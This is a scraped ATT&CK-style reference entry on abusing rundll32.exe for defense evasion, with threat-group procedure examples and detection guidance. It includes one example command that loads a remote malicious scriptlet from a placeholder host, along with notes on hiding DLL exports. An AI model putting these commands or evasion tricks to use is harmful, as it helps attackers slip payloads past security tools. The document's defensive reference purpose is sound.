Using rundll32.exe, vice executing directly (i.e.Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to executeControl PanelItem files (.cpl) through the undocumented shell32.dll functionsControl_RunDLLandControl_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.[1]Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"This behavior has been seen used by malware such as Poweliks.[2]Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the commandrundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to executeExampleFunctionW, or failing thatExampleFunctionA, before loadingExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appendingWand/orAto harmless ones.[3][4]DLL functions can also be exported and executed by an ordinal number (ex:rundll32.exe file.dll,#1).Additionally, adversaries may useMasqueradingtechniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[5]ID:T1218.011Sub-technique of:T1218ⓘTactic:Defense EvasionⓘPlatforms:WindowsⓘDefense Bypassed:Anti-virus, Application control, Digital Certificate ValidationContributors:Casey Smith; Gareth Phillips, Seek Ltd.; James_inthe_box, Me; Ricardo DiasVersion:2.2Created:23 January 2020Last Modified:14 August 2023Version PermalinkLive VersionProcedure ExamplesIDNameDescriptionC00282015 Ukraine Electric Power AttackDuring the2015 Ukraine Electric Power Attack,Sandworm Teamused a backdoor which could execute a supplied DLL usingrundll32.exe.[6]S0045ADVSTORESHELLADVSTORESHELLhas used rundll32.exe in a Registry value to establish persistence.[7]G0073APT19APT19configured its payload to inject into the rundll32.exe.[8]G0007APT28APT28executedCHOPSTICKby using rundll32 commands such asrundll32.exe "C:\Windows\twain_64.dll".APT28also executed a .dll for a first stage dropper using rundll32.exe.

(ASR) feature can be used to block methods of using rundll32.exe to bypass application control.DetectionIDData SourceData ComponentDetectsDS0017CommandCommand ExecutionCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Typical command-line usage of rundll32.exe is"rundll32.exe DllFile,EntryPoint"whereDllFileis the name of the DLL file being called and EntryPoint the name of the entry point in the DLL file.DLLs stored on SMB shares can similarly be called using the syntax of"rundll32.exe \\DllFile,EntryPoint"whereis the IPv4 address of the host of the SMB share.Rundll32 can also be used to execute arbitrary Javascript using the syntax"rundll32.exe javascript:<code_block>"where <code_block> is a string defining the Javascript code to be executed.DS0022FileFile MetadataAnalyze contextual data about executed DLL files, which may include information such as name, the content (ex: signature, headers, or data/media), age, user/owner, permissions, etc.DS0011ModuleModule LoadAnalyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls. Static Portable Executable (PE) analysis tools can be used to examine and dump the exports of a particular DLL.DS0009ProcessProcess CreationUse process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.When monitoring for all instances of Rundll32 execution, as defined by the logic in the Detection Pseudocode, it is imperative to also investigate the full set of command-line parameters used. These parameters contain key information about the DLL payload, including the name, entry point, and optional arguments.Note: Event IDs are for Sysmon (Event ID 10 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for any instances of rundll32.exe but does no other filtering, which may result in false positives. Therefore, we recommend tuning any such analytics by including additional logic (e.g., testing the name of the user that created the process) that helps reduce false positives.Analytic 1 - RunDLL32.exe Monitoring(source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="1") OR (source="WinEventLog:Security" EventCode="4688") Image= "rundll32.exe"ReferencesMerces, F.
